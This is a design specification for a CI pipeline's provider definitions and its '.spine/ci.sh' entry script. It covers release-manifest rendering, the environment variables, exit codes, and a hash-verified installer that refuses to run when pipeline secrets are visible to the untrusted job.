# The CI definitions and `.spine/ci.sh`

**Artifacts:** the shell script `.spine/ci.sh`, executed from trunk on every provider, and the three CI definitions `spine init` renders — GitHub Actions, GitLab CI, and the `generic` contract.
**Home in the playbook:** PB §7.4 rules 0–4, PB §7.1's least-privilege table, PB §5.4's two provider configurations (a) and (b), PB §7.3's protected floor. Vocabulary from PB §11, which wins over prose here as it wins there.
**References:** `PB §n` cites `PLAYBOOK.md` v0.19; `RF §n` cites `docs/spec/result-file.md`; `GR §n` cites `docs/spec/gate-report.md`; `IR §n` cites `docs/spec/import-resolver.md`; a bare `§n` cites this document.
**Spec version:** 1 · **Covers:** PLAYBOOK.md v0.19 · **Status:** normative for v1 · **Owner:** _assign before adoption_

---

## 1. Scope

`spine check --ci --collect` writes the result file `RF` specifies, and `spine check --ci --land` produces the gate report `GR` specifies. **Neither document says what invokes them.** PB §7.4 rule 0 states the invocation's security properties in one long sentence and no provider's bytes; PB §6.7's manifest lists `.spine/ci.sh` as a file with an owner class, a template name and a blob id, and no contents. This document supplies both.

In scope: the full text of `.spine/ci.sh` and its invocation contract, exit codes, installer, release-artifact layout and platform table · the two-job contract every provider must satisfy · the full GitHub Actions definition · the full GitLab CI definition · the `--ci generic` contract and its reference driver · the result-file handoff per provider, preserving its exact relative path · rule 0's key-visibility probe and the normative variable names · publication of the gate report to `refs/notes/spine`, where in the job it happens and what its failure means · the candidate-ref → `--land` mapping · which parts of each arrangement a provider can subvert and which it cannot · configurations (a) and (b).

Out of scope is §17. Where this document and PB §11 disagree, §11 wins and the disagreement is a defect in one of them — reported in §15, never resolved silently.

Four constraints from the design govern everything below and are not re-argued:

- **One clock, and it is the chain (PB §7.5).** No definition here records a time, derives anything from one, or compares two. A scheduled trigger is an *event source*, not a clock: nothing downstream of it is a function of when it fired, exactly as GR §4.4.3 argues for the notes commit's own date.
- **No state the design forbids (PB §5.4 step 6, PB §6.1).** No side file survives a run, nothing remembers that a previous attempt happened, the graph is rebuilt `--fresh` every run, and no cache is restored into the trusted job.
- **Hash policy (PB §11).** Git object ids for git objects; `sha256:<hex>` for non-git artifacts. `.spine/ci.sh` verifies the release by `sha256:` and names nothing else.
- **Policy from the base, code from the head (PB §7.4 rules 1–2).** Every value that decides anything is read from `origin/<trunk>` or from the provider's own out-of-band configuration. The checkout under test supplies no policy, not even the name of the branch policy is read from.

## 2. Position in the pipeline

| | |
|---|---|
| Written by | `spine init [--ci github\|gitlab\|generic]` (PB §11 CLI). `.spine/ci.sh` on every provider; a provider definition on `github` and `gitlab`; nothing but the contract of §9 on `generic`. |
| Owner class | `spine-owned` (PB §6.7) for `.spine/ci.sh` and for the GitLab job files under `.spine/`; the provider's workflow file starts `spine-owned` and becomes `user-modified` on `--adopt` or a successful `--merge`. |
| Floor | Every path in §3.1 is on the protected floor: `.spine/**` and the CI-definition globs of PB §7.3. Changing any of them takes a `class=protected` review by G14 and is evaluated under the **old** policy (PB §7.4 rule 1). |
| Produces | The untrusted job produces exactly one artifact, the result file of `RF`. The trusted job produces the landing commit, the gate report of `GR`, and the note on `refs/notes/spine`. |
| Consumes | Trunk's `.spine/manifest.json`, `.spine/allowed_signers` and constitution; the pinned release; the provider's out-of-band variables of §4. |
| Never consumes | Anything from the candidate's tree. Not its manifest, not its workflow file, not its `ci.sh`, not the name of its trunk. |

## 3. What `spine init` writes, per provider

### 3.1 Paths and manifest rows

| `params.ci` | Paths written | Template | Owner |
|---|---|---|---|
| every value | `.spine/ci.sh` | `ci-generic@N` | `spine-owned` |
| `github` | `.github/workflows/spine-collect.yml` | `ci-github-collect@N` | `spine-owned` |
| `github` | `.github/workflows/spine-land.yml` | `ci-github-land@N` | `spine-owned` |
| `gitlab` | `.gitlab-ci.yml` | `ci-gitlab@N` | `spine-owned` |
| `gitlab` | `.spine/gitlab/untrusted.yml` | `ci-gitlab@N` | `spine-owned` |
| `gitlab` | `.spine/gitlab/trusted.yml` | `ci-gitlab@N` | `spine-owned` |
| `generic` | *(nothing beyond `.spine/ci.sh`)* | — | — |

**`.spine/restore.sh` is not in this table, and that is deliberate.** The dependency-restore phase RF §7.1 gives the collector reads its bytes from `origin/<trunk>:.spine/restore.sh`, and the path is the **repository's**: `spine init` writes no such file, no template renders one, and the manifest carries no `files[]` record for it (`manifest.md` §6.2 requires none). Where trunk has no such file the phase is empty and every runner still runs loopback-only. It is nevertheless on the protected floor by `.spine/**` like every other path under it (PB §7.3), which is what makes trunk's copy — the only copy the collector ever runs — a reviewed one.

**The template name `ci-generic` names the provider-independent shell, not the `generic` provider.** PB §6.7's own manifest example proves it: a repository whose `params.ci` is `"github"` carries `.spine/ci.sh` with `"template": "ci-generic@4"`. Reading `ci-generic` as "the template for `--ci generic`" produces a repository that writes no `ci.sh` for GitHub, which nothing then executes. §15 D16.

**The two GitHub files take two template names, not one.** `workflow_run` selects its trigger by the triggering workflow's `name:` (§3.2), so the two files are two artifacts with two independent version counters; one name for both would make G16's check 7 unable to tell a collector rendered at `@4` from a lander left at `@3`, which is the whole of what that check does. `manifest.md` §3.6 owns the split and this table adopts it; nothing here spells a GitHub template `ci-github@N` any more. `templates` in the manifest carries **twelve** keys — `agents-block · ci-generic · ci-github-collect · ci-github-land · ci-gitlab · constitution · gitattributes · gitignore · intent · intent-bug · intent-change · keyring` — one per template the pinned release ships, whether or not this repository holds a rendered instance, which is why `ci-gitlab` is there under `--ci github` (`manifest.md` §3.6, PB §6.7). §15 D1, closed.

### 3.2 Two GitHub files, not one

PB §11 named one GitHub path, `.github/workflows/spine.yml`, and one file cannot carry both jobs. **PB v0.19 adopted the split**: §11's *Files and refs* paragraph now names `.github/workflows/spine-collect.yml` and `.github/workflows/spine-land.yml`, §10's budget table counts them as one uncounted pair, and §6.7's manifest example carries a `files[]` record for each. The reason the split was needed is still worth stating, because it is what makes two names load-bearing rather than cosmetic: The trusted job is triggered by `workflow_run` on the untrusted workflow (PB §7.4 rule 0), and `workflow_run` selects the triggering workflow **by its `name:`**, so a single file naming itself fires on its own completion: every trusted run triggers another trusted run, which the `if:` guard skips and which nonetheless completes and triggers a third. Two files, two names, one direction. §15 D2.

### 3.3 Rendered constants

The templates carry render-time tokens that `spine init` substitutes from the **release manifest** §3.4 defines — a versioned file frozen into the binary when the release is built:

| Token | Substituted with |
|---|---|
| `@@DIST_BASE@@` | the release's distribution root, an `https://` URL (§5.5) |
| `PIN_CHECKOUT`, `PIN_UPLOAD_ARTIFACT`, `PIN_DOWNLOAD_ARTIFACT` | full 40-hex commit ids of the three GitHub actions the release pins |
| `main` in every example below | trunk's name, from `params.trunk` |

**A rendered file still containing `@@` or a `PIN_` token is not a conforming render, and `init` refuses to write it.** §3.4 gives that sentence its mechanical form — which files are scanned, for which byte sequences, at which point in the plan, and what a build with no frozen release manifest does instead. The tokens appear in this document because inventing a distribution hostname or a third party's commit id would be publishing a digest nobody computed (§14 R5, §18 OPEN-1 and OPEN-7).

### 3.4 The release manifest — where the rendered constants come from

§3.3's values are **release-time inputs, not design constants**. The distribution root is a host the owner operates and this corpus cannot name; the three pins are a third party's commit ids that change on a schedule nobody here controls. What is fixed in this section is not a value but the **file that carries them**, so that two implementations substitute from the same place, in the same order, and a build that has no such file cannot pretend to have one.

**Location, and what it is not.** `release/release.json`, at the root of spine-kit's **own source tree**. It is a build input: read once when the binary is built, frozen into it, and never consulted again. It is not written into an adopting repository, no `files[]` record names it, no owner class applies to it, it is on no floor, and no gate reads it. Nothing at run time re-reads it from disk, so a repository cannot supply one and a candidate cannot forge one.

**Format.** UTF-8 JSON, read by an ordinary parser. No canonical form is required and none is defined, because nothing digests this file: its bytes leave no trace, only the values it hands `init` do, and those are checked where they land — the four render tokens by the token scan below, `version` by `manifest.md` §3.2's grammar.

**Schema — every member required, nothing else permitted.**

| Member | Type | Value |
|---|---|---|
| `release_manifest_version` | integer | `1`. A build that meets a value it does not know refuses rather than guessing which members are present. |
| `version` | string | The release's version: `^[0-9A-Za-z._+-]{1,64}$` and never the four bytes `none` (`manifest.md` §3.2, which is also §5.5's `<version>` production). This is the string `init` writes as `cli.version`, and the one the artifact names in §5.5's list carry. |
| `dist_base` | string | The distribution root, substituted for `@@DIST_BASE@@`. Scheme `https://`; no userinfo, no query, no fragment; **no trailing `/`** — `ci.sh` appends one (§5.3), and two spellings of one root would render two `ci.sh` blobs for one release. |
| `actions` | object | Exactly three members — `checkout`, `upload_artifact`, `download_artifact` — each an object with exactly `repo` and `commit`. |
| `actions.<k>.commit` | string | Exactly 40 lowercase hex digits: a full commit id, **never a tag and never an abbreviation**. This is the requirement §18 OPEN-7 says is normative here while the versions themselves are not. |
| `actions.<k>.repo` | string | `actions/checkout`, `actions/upload-artifact`, `actions/download-artifact`, one per key and fixed. Recorded so the build checks the pin against the `uses:` line that will carry it and refuses a manifest that pins the checkout commit into the download step — a transposition no later check catches, because all three are well-formed 40-hex strings. |

**An unknown member is a refusal, not opaque data.** This is the opposite of `.spine/manifest.json`'s rule (PB §6.7, `manifest.md` §3.9), and for the opposite reason: a repository manifest must be judged by binaries older than itself, so forward compatibility is worth an ignored key. This file is read only by the build that freezes it, forward compatibility buys nothing, and an ignored typo — `dist_bases`, `pins` — ships a placeholder into every repository the release initialises.

**Not members, and why.** `dist_hash` is not one: it is substituted into no template, it is written into `.spine/manifest.json` as `cli.dist_hash`, and it is the digest of the §5.5 artifact list, which is fixed only once every artifact is built. §5.5 and `manifest.md` §3.2 own it and PB §6.7 makes it a constant the release carries; this section does not move it. Neither are the twelve template names and versions (§3.1, `manifest.md` §3.6), the shipped floor `F0` (`manifest.md` §5.5), the twelve constitution rules (CN §6.2), or `SPINE_ALLOWED_HOSTS` (§5.6). Those are **source constants**: they are decided in the tree, change under review, and are knowable before a release is cut. The release manifest carries only what cannot be known until it is.

**A development build refuses `spine init`.** A build embedding a release manifest that satisfies the schema above is a **release build**; anything else — no file, a file the schema refuses, an unknown `release_manifest_version` — is a **development build**. A development build renders no CI definition, writes no `.spine/manifest.json`, creates no path, and reports `REFUSE` for every row of the plan (PB §6.7's `create · update · delete · skip · REFUSE`) with the diagnostic `no-release-manifest`. It does **not** fall back on a default host, a tag in place of a commit, an empty string, or a rendered file with the token left in.

The reason is the design's own. PB §7.4 rule 2 rests the whole trusted-execution argument on a pinned, hash-verified release, and every CI artifact `init` writes names that release — the root it fetches from and the actions it pins. A binary that cannot name it can still produce a repository that *looks* initialised, whose first CI run fetches nothing and whose workflow references an action at a ref that is not a commit. Refusing the plan whole is the only outcome that leaves the repository exactly as it was. A development build meeting an *already* initialised repository needs no new rule: G15 disposes of it, since its platform artifact is in no release's list (PB §6.3).

**How `spine init` consumes it, in order.**

1. **Validate first.** Parse and check the embedded release manifest against the schema above **before any plan is computed**. Failure is `no-release-manifest` and nothing is written.
2. **Build the CI substitution table** — exactly §3.3's rows and no others: `@@DIST_BASE@@` → `dist_base`; `PIN_CHECKOUT` → `actions.checkout.commit`; `PIN_UPLOAD_ARTIFACT` → `actions.upload_artifact.commit`; `PIN_DOWNLOAD_ARTIFACT` → `actions.download_artifact.commit`; the trunk name → `params.trunk`. What the other eight templates render from — `params.langs` into `C-T1`/`C-T2` (CN §6.4), an intent's fields (TM), the keyring's principal — is theirs and is untouched here.
3. **Substitute literally, once, and never recursively.** Every occurrence of a token is replaced by the value's bytes, and no substituted value is ever rescanned for tokens. The render is a function of the table, not of the order the table is walked.
4. **Only the four CI templates carry a `@@` or `PIN_` token** — `ci-generic`, `ci-github-collect`, `ci-github-land`, `ci-gitlab` (§3.1); `ci-generic` carries `@@DIST_BASE@@` and no trunk name, since `ci.sh` takes trunk as an argument (§5.1). No other template the release ships contains either token, and none is scanned.
5. **Scan every rendered CI file** for surviving tokens, below.
6. **Only then** does the plan compare blob ids and write.

The order is load-bearing: the scan precedes every write, and one failure refuses the **whole** plan rather than writing the paths that happened to pass. A repository half-scaffolded by a bad release is worse than one not scaffolded at all, which is the same argument PB §6.7 makes for `init --abort`.

**The token-free check, mechanically.** For each rendered CI file, after every substitution of step 3, the file's bytes must contain:

- no occurrence of `@@` — two `U+0040`, in any context; and
- no occurrence of `PIN_CHECKOUT`, `PIN_UPLOAD_ARTIFACT` or `PIN_DOWNLOAD_ARTIFACT`.

Any occurrence is `unsubstituted-token`: the whole plan is `REFUSE` and nothing is written. It is a byte scan over the rendered bytes and reads nothing else — it re-parses no YAML, does not know which template produced the bytes, and gives the same answer on every platform. This is the mechanical form of §3.3's sentence and of §13's conformance item 1; the prose there states the rule, this states the test.

**The one residual the byte scan buys, and why it is accepted.** The trunk name is substituted into the three provider definitions, so a trunk literally named with `@@` in it, or named for one of the three `PIN_` literals, renders a *conforming* file that the scan then refuses. `init` therefore refuses such a name where it is given, at `--trunk`, as `trunk-name-collides-with-token`, rather than letting the refusal fire later on a name git itself accepts; a repository whose manifest already carries one meets the same refusal at the scan instead, which is the fail-closed direction and leaves its tree untouched. The manifest's grammar is unchanged — `params.trunk` is still any name `git check-ref-format --branch` accepts (`manifest.md` §3.3) — exactly as `params.isolation: "uid"` is a well-formed value `init` refuses to write. The alternative — scanning before the trunk substitution — makes the conformance test depend on substitution order, and an order-dependent test is one two implementations can disagree about while both believing they conform.

**Every value above is the owner's, and none is in this corpus.** §18 OPEN-1 is the host `dist_base` names; §18 OPEN-7 is the three commits. Until both are chosen no release manifest can be frozen, and therefore **no binary built from this corpus renders a CI definition at all** — which is the correct behaviour for a design whose CI argument rests on a pinned release, and is why this document prints tokens rather than a hostname somebody would later have to un-invent (§14 R5). Nothing in this section is a value; all of it is the shape the values must arrive in.

## 4. Normative environment variables

PB §11 names two. A conforming arrangement needs five, and the three additions are reported as a §11 amendment in §15 D15.

| Name | Kind | Job | Meaning |
|---|---|---|---|
| `SPINE_TRUST_ROOT` | variable, not secret | **both** | The trust-root commit sha (PB §7.5). `spine check --ci` refuses to run without one, so the untrusted job needs it too. Never read from a tracked file. |
| `SPINE_PIPELINE_KEY` | **secret** | trusted only | The OpenSSH **private key** of the `spine-seal@v1` principal, as key material, not a path. Read from the environment and never written to disk. Its visibility to the untrusted job is what rule 0's probe refuses (§6.1). |
| `SPINE_PUSH_TOKEN` | **secret** | trusted only | The credential the trusted job pushes trunk with — the bypass principal of configuration (a). Rule 0 requires it to be a credential the untrusted job does not share, so it is **never** the provider's ambient job token. |
| `SPINE_PUSH_KEY` | **secret** | trusted only | The SSH alternative to `SPINE_PUSH_TOKEN`, for providers or hosts where HTTPS credentials are unavailable. Exactly one of the two is set; both set, or neither, is a refusal. |
| `SPINE_DIST_BASE` | variable, not secret | both, optional | Overrides the distribution root the release manifest froze into `ci.sh` (§3.4, §5.5). Present so a repository can mirror the release; it changes no hash that is checked. |

Two more are read by `.spine/ci.sh` and are conveniences, not policy: `SPINE_INSTALL_DIR` (where a verified binary is unpacked) and `SPINE_REGISTRY_PROXY` (§5.6).

**The seal principal is not a variable.** The trusted stage reads `.spine/allowed_signers` at the seal's `base=`, takes the principals listed under `spine-seal@v1`, and selects the one whose public key corresponds to the private key in `SPINE_PIPELINE_KEY`. Zero matches or several: refuse, exit 3. Naming the principal in a variable would let a misconfigured job sign under an identity the keyring does not grant (§14 R18).

## 5. `.spine/ci.sh`

### 5.1 The invocation contract

```
git show "origin/<trunk>:.spine/ci.sh" >"$TMP/ci.sh"
sh "$TMP/ci.sh" install <trunk>                    # trusted job
sh "$TMP/ci.sh" collect <trunk> <candidate-ref>    # untrusted job
```

- **It is executed from trunk, never from the checkout** (PB §7.4 rule 0). The bytes come out of `git show origin/<trunk>:.spine/ci.sh` and go to a file **outside the repository working tree** — `$TMP` is the job's private scratch directory, not the workspace — which is then run with `sh`.
- **It is never piped into `sh -s`.** A shell reading its script from file descriptor 0 shares that descriptor with every child it spawns, so the first child that reads stdin consumes the rest of the script. `.spine/ci.sh` spawns `tar`, `git`, `curl` and the collector, and the collector spawns runners the repository controls. Piping would make the script's own remaining bytes readable — and consumable — by candidate code. §14 R2.
- **Both modes take the trunk name as an argument.** `ci.sh` must read policy from `origin/<trunk>` before it can read anything, and the only in-repository source of trunk's name is the candidate's own manifest. The name therefore comes from the CI definition, which is out-of-band configuration (PB §7.3: "`params.trunk` is a rendering hint, and the trusted stage protects the branch it is configured for out-of-band"), and `ci.sh` cross-checks it against `params.trunk` in trunk's manifest as a misconfiguration guard. §14 R3, §15 D14.
- **`collect` requires HEAD to be on the candidate branch** and refuses otherwise. That is how the collector learns `H`: PB §11's CLI gives `--collect` no argument that could name a ref, so `H` is `git symbolic-ref HEAD` and a detached HEAD is a refusal. §14 R7, §15 D9.
- **stdout carries exactly one line on success and nothing else.** `install` prints the absolute path of the verified binary; `collect` prints `result=<repo-relative path>`. Every diagnostic, and all of the collector's own output, goes to stderr. A definition that greps stdout for anything else is reading a stream this contract does not offer.

### 5.2 Exit codes

| Exit | Meaning | The definition's obligation |
|---|---|---|
| 0 | `install` succeeded, or the collector ran and exited 0. | Continue. |
| 1 | The collector ran, exited non-zero, and **a result file exists**. | Hand the file over anyway, then fail the job. |
| 2 | Refused. Nothing ran and **no result file exists**. | Fail the job; there is nothing to hand over. |

Three codes and no more, for the reason RF §4.4 gives for one `end` record: the file's `end.status` already carries every distinction the mechanism makes, and a fourth exit code would be a second, unsealed spelling of it. The split that matters is 1 against 2 — *a file exists* against *no file exists* — because it is what tells the definition whether to upload an artifact.

### 5.3 The script, in full

Reproduced byte for byte. Tabs are tabs; every line ends `LF`; there is exactly one trailing `LF`.

```sh
#!/bin/sh
# .spine/ci.sh — spine-kit's CI entry point.  Rendered by `spine init` from template
# ci-generic@4; owner class `spine-owned` (PB 6.7).  Do not edit: `spine init` refuses
# to upgrade a copy whose blob differs from the manifest's, and `.spine/**` is on the
# protected floor (PB 7.3), so a change here takes a protected review.
#
# Invocation — always from trunk, never from the checkout (PB 7.4 rule 0):
#     git show "origin/<trunk>:.spine/ci.sh" >"$TMP/ci.sh"
#     sh "$TMP/ci.sh" install <trunk>                    # trusted job
#     sh "$TMP/ci.sh" collect <trunk> <candidate-ref>    # untrusted job
#
# stdout carries exactly one line on success and nothing else:
#     install -> the absolute path of the hash-verified spine binary
#     collect -> result=<repo-relative path of the result file>
# Every diagnostic goes to stderr.
#
# Exit: 0 the collector ran and exited 0 (or `install` succeeded)
#       1 the collector ran, exited non-zero, and a result file exists
#       2 refused: nothing ran and no result file exists

set -eu

# Render-time constants.  `spine init` substitutes them; a rendered ci.sh still
# containing a '@@' token is not a conforming render and init refuses to write it.
SPINE_DIST_BASE_DEFAULT='@@DIST_BASE@@'

NL="$(printf '\n_')"; NL="${NL%_}"
IFS="$(printf ' \t\n_')"; IFS="${IFS%_}"
LC_ALL=C
export LC_ALL

# Not `umask 077`.  RF 7.1's M1 spawns every runner, and its boundary probe,
# under an id that is by construction neither the collector's uid nor 0, and the
# collector inherits this umask: at 077 every checkout it writes, and every file
# under $INSTALL_DIR, is unreachable to that id and M1 fails a prerequisite
# rather than a test.  The restrictive mode is applied to $WORK instead, which is
# the only directory here that ever holds unverified bytes.
umask 022

die() {
	_die_rc=$1
	shift
	printf 'spine/ci.sh: %s\n' "$*" >&2
	exit "$_die_rc"
}

have() { command -v "$1" >/dev/null 2>&1; }

# ---------------------------------------------------------------- PATH hygiene
# Drop every relative or empty PATH entry: a candidate that commits ./git or
# ./curl must not be able to interpose on anything below.
sanitize_path() {
	_sp_out=''
	_sp_rest="${PATH-}"
	while [ -n "$_sp_rest" ]; do
		case "$_sp_rest" in
		*:*)
			_sp_head="${_sp_rest%%:*}"
			_sp_rest="${_sp_rest#*:}"
			;;
		*)
			_sp_head="$_sp_rest"
			_sp_rest=''
			;;
		esac
		case "$_sp_head" in
		/*)
			if [ -z "$_sp_out" ]; then
				_sp_out="$_sp_head"
			else
				_sp_out="$_sp_out:$_sp_head"
			fi
			;;
		esac
	done
	printf '%s' "$_sp_out"
}
PATH="$(sanitize_path)"
export PATH
[ -n "$PATH" ] || die 2 'PATH contains no absolute directory'

# -------------------------------------------------------------------- helpers
sha256_of() {
	if have sha256sum; then
		sha256sum "$1" </dev/null | cut -d' ' -f1
	elif have shasum; then
		shasum -a 256 "$1" </dev/null | cut -d' ' -f1
	elif have openssl; then
		openssl dgst -sha256 -r "$1" </dev/null | cut -d' ' -f1
	else
		die 2 'no SHA-256 utility: need sha256sum, shasum or openssl'
	fi
}

fetch_to() {
	if have curl; then
		curl -fsS --proto '=https' --tlsv1.2 --retry 3 --max-time 300 \
			-o "$2" "$1" </dev/null
	elif have wget; then
		wget -q --https-only -O "$2" "$1" </dev/null
	else
		die 2 'no HTTPS client: need curl or wget'
	fi
}

# json_one <key> <file> — print the single JSON string value of <key>, refusing
# absence and ambiguity.  This is not a JSON parser: it splits on JSON structure
# characters and accepts only a line that is exactly `"key": "value"`, so a
# member of that name anywhere else in the document is a refusal, not a guess.
json_one() {
	_jo_v="$(tr ',{}[]' '\n\n\n\n\n' <"$2" |
		sed -n 's/^[	 ]*"'"$1"'"[	 ]*:[	 ]*"\([^"]*\)"[	 ]*$/\1/p')"
	case "$_jo_v" in
	'') die 2 "manifest: no \"$1\" member" ;;
	*"$NL"*) die 2 "manifest: \"$1\" occurs more than once" ;;
	esac
	printf '%s' "$_jo_v"
}

# ------------------------------------------------------------------ arguments
MODE="${1-}"
TRUNK="${2-}"
CANDIDATE="${3-}"
[ $# -ge 2 ] || die 2 'usage: ci.sh install <trunk> | ci.sh collect <trunk> <candidate-ref>'
case "$MODE" in
install | collect) : ;;
*) die 2 "unknown mode: $MODE" ;;
esac
[ "$MODE" = install ] || [ $# -eq 3 ] || die 2 'collect needs a candidate ref'

# ------------------------------------------------- rule 0: key-visibility probe
# The untrusted job asserts, by refusing to run, that no spine credential is
# reachable from it.  This is checked before anything is downloaded and long
# before any repository code is executed.
if [ "$MODE" = collect ]; then
	for _v in SPINE_PIPELINE_KEY SPINE_PUSH_KEY SPINE_PUSH_TOKEN; do
		eval "_seen=\${$_v+set}"
		if [ "${_seen-}" = set ]; then
			die 2 "rule 0: $_v is visible to the untrusted job"
		fi
	done
	unset _v _seen
	[ -n "${SPINE_TRUST_ROOT-}" ] ||
		die 2 'SPINE_TRUST_ROOT is unset; spine check --ci refuses to run without it'
fi

# ------------------------------------------------------------ git preflight
have git || die 2 'git not found'
_gv="$(git --version </dev/null)"
_gv="${_gv#git version }"
_gvmaj="${_gv%%.*}"
_gvrest="${_gv#*.}"
_gvmin="${_gvrest%%.*}"
case "$_gvmaj$_gvmin" in
'' | *[!0-9]*) die 2 "cannot parse git version: $_gv" ;;
esac
if [ "$_gvmaj" -lt 2 ] || { [ "$_gvmaj" -eq 2 ] && [ "$_gvmin" -lt 38 ]; }; then
	die 2 "git >= 2.38 required (merge-tree --write-tree); found $_gv"
fi
git rev-parse --git-dir >/dev/null 2>&1 || die 2 'not inside a git repository'
git check-ref-format --branch "$TRUNK" >/dev/null 2>&1 ||
	die 2 "not a branch name: $TRUNK"
if [ "$MODE" = collect ]; then
	git check-ref-format --branch "$CANDIDATE" >/dev/null 2>&1 ||
		die 2 "not a branch name: $CANDIDATE"
fi

WORK="$(mktemp -d "${TMPDIR:-/tmp}/spine-ci.XXXXXX")" || die 2 'mktemp failed'
chmod 0700 "$WORK" || die 2 "cannot restrict $WORK"
OWN_INSTALL_DIR=''
cleanup() {
	[ -z "$WORK" ] || rm -rf "$WORK"
	[ -z "$OWN_INSTALL_DIR" ] || rm -rf "$OWN_INSTALL_DIR"
}
trap cleanup EXIT
trap 'cleanup; trap - EXIT; exit 2' INT TERM HUP

# ------------------------------------------------- policy, read from the base
git show "origin/$TRUNK:.spine/manifest.json" >"$WORK/manifest.json" 2>/dev/null ||
	die 2 "cannot read origin/$TRUNK:.spine/manifest.json"
MANIFEST_TRUNK="$(json_one trunk "$WORK/manifest.json")"
[ "$MANIFEST_TRUNK" = "$TRUNK" ] ||
	die 2 "manifest names trunk \"$MANIFEST_TRUNK\", invoked with \"$TRUNK\""
DIST_HASH="$(json_one dist_hash "$WORK/manifest.json")"
case "$DIST_HASH" in
sha256:*) DIST_HASH="${DIST_HASH#sha256:}" ;;
*) die 2 'manifest: cli.dist_hash is not sha256:<hex>' ;;
esac
case "$DIST_HASH" in
*[!0-9a-f]* | '') die 2 'manifest: cli.dist_hash is not lowercase hex' ;;
esac
[ "${#DIST_HASH}" -eq 64 ] || die 2 'manifest: cli.dist_hash is not 64 hex digits'

# ------------------------------------------------- install, and verify by hash
DIST_BASE="${SPINE_DIST_BASE:-$SPINE_DIST_BASE_DEFAULT}"
case "$DIST_BASE" in
https://*) : ;;
*) die 2 'SPINE_DIST_BASE must be an https:// URL' ;;
esac
case "$DIST_BASE" in
*[!/]) DIST_BASE="$DIST_BASE/" ;;
esac

_os="$(uname -s </dev/null)"
_arch="$(uname -m </dev/null)"
case "$_os" in
Linux)
	case "$_arch" in
	x86_64 | amd64) TARGET='x86_64-unknown-linux-musl' ;;
	aarch64 | arm64) TARGET='aarch64-unknown-linux-musl' ;;
	*) die 2 "unsupported architecture: $_os/$_arch" ;;
	esac
	;;
Darwin)
	case "$_arch" in
	arm64) TARGET='aarch64-apple-darwin' ;;
	x86_64) TARGET='x86_64-apple-darwin' ;;
	*) die 2 "unsupported architecture: $_os/$_arch" ;;
	esac
	;;
*) die 2 "unsupported platform: $_os (v1 ships no Windows CI target)" ;;
esac

INSTALL_DIR="${SPINE_INSTALL_DIR-}"
if [ -z "$INSTALL_DIR" ]; then
	INSTALL_DIR="$(mktemp -d "${TMPDIR:-/tmp}/spine-bin.XXXXXX")" || die 2 'mktemp failed'
	if [ "$MODE" = collect ]; then OWN_INSTALL_DIR="$INSTALL_DIR"; fi
fi
mkdir -p "$INSTALL_DIR"
# mktemp -d creates 0700 whatever the umask, and a contained runner's mapped id
# has to reach the hash-verified binary the probe re-execs (RF 7.1).  It is a
# release artifact, not a secret; the directory stays writable only by us.
chmod 0755 "$INSTALL_DIR" || die 2 "cannot make $INSTALL_DIR traversable"
BIN="$INSTALL_DIR/spine"

fetch_to "${DIST_BASE}${DIST_HASH}/artifacts.txt" "$WORK/artifacts.txt" ||
	die 2 'cannot fetch the release artifact list'
_got="$(sha256_of "$WORK/artifacts.txt")"
[ "$_got" = "$DIST_HASH" ] ||
	die 2 "artifact list hash $_got does not equal the pinned $DIST_HASH"

_line="$(sed -n "s/^\\([0-9a-f]\\{64\\}\\)  \\(spine-[0-9A-Za-z._+-]*-$TARGET\\.tar\\.gz\\)\$/\\1 \\2/p" \
	"$WORK/artifacts.txt")"
case "$_line" in
'') die 2 "the pinned release publishes no artifact for $TARGET" ;;
*"$NL"*) die 2 "the pinned release publishes more than one artifact for $TARGET" ;;
esac
ART_SHA="${_line%% *}"
ART_NAME="${_line#* }"

fetch_to "${DIST_BASE}${DIST_HASH}/${ART_NAME}" "$WORK/$ART_NAME" ||
	die 2 "cannot fetch $ART_NAME"
_got="$(sha256_of "$WORK/$ART_NAME")"
[ "$_got" = "$ART_SHA" ] ||
	die 2 "$ART_NAME hash $_got does not equal the listed $ART_SHA"

have gzip || die 2 'gzip not found'
have tar || die 2 'tar not found'
gzip -dc "$WORK/$ART_NAME" | (cd "$INSTALL_DIR" && tar -xf -) ||
	die 2 "cannot unpack $ART_NAME"
[ -f "$BIN" ] || die 2 "$ART_NAME contains no spine binary at its root"
chmod 0755 "$BIN"

if [ "$MODE" = install ]; then
	printf '%s\n' "$BIN"
	exit 0
fi

# ------------------------------------------------- registry allowlist (PB 7.1)
# Dependency restore is the untrusted job's only network access.  This file
# *declares* the allowlist and configures the clients that honour one; the
# isolation boundary is what *enforces* it.  SwiftPM has no single environment
# knob: its mirrors live in the repository's own build configuration, which
# C-T2 freezes and G8 guards.
SPINE_ALLOWED_HOSTS='pypi.org files.pythonhosted.org registry.npmjs.org pub.dev'
export SPINE_ALLOWED_HOSTS
if [ -n "${SPINE_REGISTRY_PROXY-}" ]; then
	case "$SPINE_REGISTRY_PROXY" in
	https://*) : ;;
	*) die 2 'SPINE_REGISTRY_PROXY must be an https:// URL' ;;
	esac
	PIP_INDEX_URL="${SPINE_REGISTRY_PROXY%/}/pypi/simple"
	NPM_CONFIG_REGISTRY="${SPINE_REGISTRY_PROXY%/}/npm/"
	PUB_HOSTED_URL="${SPINE_REGISTRY_PROXY%/}/pub"
	export PIP_INDEX_URL NPM_CONFIG_REGISTRY PUB_HOSTED_URL
fi

# --------------------------------------------------------- the synthetic merge
git rev-parse --verify -q "refs/remotes/origin/$TRUNK" >/dev/null ||
	die 2 "refs/remotes/origin/$TRUNK is not fetched"
git rev-parse --verify -q "refs/heads/$CANDIDATE" >/dev/null ||
	die 2 "refs/heads/$CANDIDATE is not fetched"
_head="$(git symbolic-ref --quiet --short HEAD || printf '')"
[ "$_head" = "$CANDIDATE" ] ||
	die 2 "HEAD is not on $CANDIDATE (the collector reads H from HEAD)"

if ! T="$(git merge-tree --write-tree "refs/remotes/origin/$TRUNK" \
	"refs/heads/$CANDIDATE" 2>"$WORK/mt.err")"; then
	cat "$WORK/mt.err" >&2
	die 2 'merge-tree reports a conflict: needs-rebase'
fi
case "$T" in
*"$NL"*) T="${T%%"$NL"*}" ;;
esac
case "$T" in
'' | *[!0-9a-f]*) die 2 'merge-tree produced no tree object id' ;;
esac

# ----------------------------------------------------------------- the collect
TOP="$(git rev-parse --show-toplevel)"
RESULT=".spine/cache/results/$T.jsonl"
set +e
(cd "$TOP" && exec "$BIN" check --ci --collect) </dev/null >&2
COLLECTOR_RC=$?
set -e
[ -f "$TOP/$RESULT" ] || die 2 "the collector wrote no result file at $RESULT"
printf 'result=%s\n' "$RESULT"
[ "$COLLECTOR_RC" -eq 0 ] || exit 1
exit 0
```

